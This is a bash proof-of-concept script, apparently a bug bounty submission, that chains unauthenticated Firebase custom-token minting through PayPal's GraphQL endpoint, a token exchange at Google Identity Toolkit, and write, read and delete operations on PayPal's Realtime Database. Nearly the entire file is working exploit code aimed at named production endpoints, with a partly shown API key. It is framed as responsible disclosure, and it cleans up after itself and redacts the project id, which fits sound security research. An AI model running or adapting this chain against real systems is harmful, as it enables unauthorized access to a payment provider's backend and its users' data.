# poc.sh - unauth Firebase token mint -> RTDB message-bus R/W
# Target: https://www.paypal.com/graphql  (query firebase.auth)
#         https://identitytoolkit.googleapis.com  (token exchange, public key)
#         https://api-project-[redacted].firebaseio.com  (PayPal RTDB)
# Caller: unauthenticated. Uses recon/owned uid only.
#
# Chain: mint attacker-uid custom token (no auth) -> exchange for idToken ->
#        write/read users/{uid}/messages -> cleanup. Top-level /users control
#        is 401 (rules hold for non-minted paths).
set -u
GQ="https://www.paypal.com/graphql"
ITK="https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=AIzaSyCjAXE6JoC5e..."
RTDB="https://api-project-[redacted].firebaseio.com"
SESSIONUID="poc_demo_uid_$(date +%s)"

echo ""
echo "---------------------------------------------------------------------------------------------"
echo ""
echo "x.com/3907_bh | github.com/3907-bh | PoC - unauth Firebase token mint -> RTDB message-bus R/W"
echo "$(date -u '+%Y-%m-%d %H:%M:%S UTC')"
echo

# STEP 1 - mint custom token (no auth, no rate limit)
echo "--- Mint Firebase custom token via GraphQL with with ---"
echo "  POST $GQ?GetFireBaseSessionToken   sessionUID=$SESSIONUID (attacker-controlled)"
MINT=$(curl -s -m 25 -X POST "$GQ?GetFireBaseSessionToken" \
  -H "Content-Type: application/json" -H "x-app-name: smart-payment-buttons" \
  -d "{\"query\":\"query G(\$s:String!){firebase{auth(sessionUID:\$s){sessionToken}}}\",\"variables\":{\"s\":\"$SESSIONUID\"}}")
CTOK=$(echo "$MINT" | python3 -c "import json,sys;print(json.load(sys.stdin)['data']['firebase']['auth']['sessionToken'])")
echo "  -> RS256 custom token minted: ${CTOK:0:50}..."
echo "     (signed by firebase-adminsdk-9vksp@api-project-[redacted].iam.gserviceaccount.com)"
echo

# STEP 2 - exchange for idToken (public web API key)
echo "--- Exchange custom token for idToken (Identity Toolkit, public key) ---"
EXCH=$(curl -s -m 25 -X POST "$ITK" -H "Content-Type: application/json" \
  -d "{\"token\":\"$CTOK\",\"returnSecureToken\":true}")
IDTOK=$(echo "$EXCH" | python3 -c "import json,sys;print(json.load(sys.stdin)['idToken'])")
NEWUSER=$(echo "$EXCH" | python3 -c "import json,sys;print(json.load(sys.stdin).get('isNewUser'))")
echo "  -> idToken minted: ${IDTOK:0:50}...   isNewUser=$NEWUSER"
echo

# STEP 3 - WRITE users/{uid}/messages
echo "--- WRITE users/{$SESSIONUID}/messages (auth.uid == uid; uid attacker-controlled) ---"
WCODE=$(curl -s -m 20 -X PUT -o /tmp/wr -w "%{http_code}" \
  "$RTDB/users/$SESSIONUID/messages/msg1.json?auth=$IDTOK" \
  -d '{"injected":"poc_message","from":"attacker","session_uid":"ATTACKER_CONTROLS_THIS"}')
echo "  PUT .../messages/msg1.json?auth=<idToken>  -> HTTP $WCODE"
echo "  response: $(head -c 120 /tmp/wr)"
echo

# STEP 4 - READ it back
echo "--- READ it back (cross-uid read of an attacker-minted path) ---"
RCODE=$(curl -s -m 20 -o /tmp/rr -w "%{http_code}" "$RTDB/users/$SESSIONUID/messages.json?auth=$IDTOK")
echo "  GET .../messages.json?auth=<idToken>  -> HTTP $RCODE"
echo "  response: $(head -c 200 /tmp/rr)"
echo

# STEP 5 - cleanup
DCODE=$(curl -s -m 20 -X DELETE -o /dev/null -w "%{http_code}" "$RTDB/users/$SESSIONUID/messages/msg1.json?auth=$IDTOK")
echo "--- CLEANUP: DELETE .../messages/msg1.json -> HTTP $DCODE ---"
echo

# STEP 6 - control
echo "--- CONTROL: top-level /users.json (rules hold for non-minted paths) ---"
curl -s -m 15 -o /tmp/tl -w "  GET /users.json?auth=<idToken> -> HTTP %{http_code}\n" "$RTDB/users.json?auth=$IDTOK"
echo "  response: $(head -c 80 /tmp/tl)"
echo
echo " => mint+exchange+write+read+cleanup all succeed WITHOUT AUTH"

echo "---------------------------------------------------------------------------------------------"
echo ""